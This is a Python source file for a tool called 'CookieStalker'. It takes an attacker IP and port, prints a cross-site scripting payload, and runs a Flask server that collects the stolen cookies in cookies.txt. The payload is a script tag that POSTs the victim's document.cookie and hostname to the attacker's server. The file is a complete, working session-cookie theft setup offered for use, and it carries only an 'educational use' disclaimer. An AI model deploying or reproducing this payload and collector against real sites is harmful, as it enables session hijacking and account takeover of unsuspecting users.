import os.path
import pyfiglet

from flask import Flask, request
from flask_cors import CORS


print("\n")
ascii_banner = pyfiglet.figlet_format("CookieStalker")
print(ascii_banner)
print("calfcrusher@inventati.org | For educational use only.\n")

IP = input("Enter IP: ")
PORT = input("Enter port: ")

print("\n*** XSS payload ***\n")
payload = "<script>var xmlhttp = new XMLHttpRequest(); xmlhttp.open(\"POST\", \"http://" + IP + ":" + PORT + "/\", true); xmlhttp.send(JSON.stringify({hostname: window.location.host, session:document.cookie}));</script>"
print(payload)
print("\n")

app = Flask(__name__)

CORS(app)

# If cookies.txt exists, load it in stolen_cookies variable
# else initialize it as empty string
if os.path.exists('cookies.txt'):
    with open('cookies.txt', 'r') as file:
        stolen_cookie = file.read()
else:
    stolen_cookie = ''


@app.route('/', methods=['POST'])
def index():
    # Get Cookie :)
    cookies = request.get_json('cookies')
    # Check if cookie is None and keep duplicates at minimum
    if cookies is not None and str(cookies) not in stolen_cookie:
        with open('cookies.txt', 'a+') as fd:
            fd.write(str(cookies))
        print(cookies)

    return 'OK'


app.run(host=IP, port=PORT)
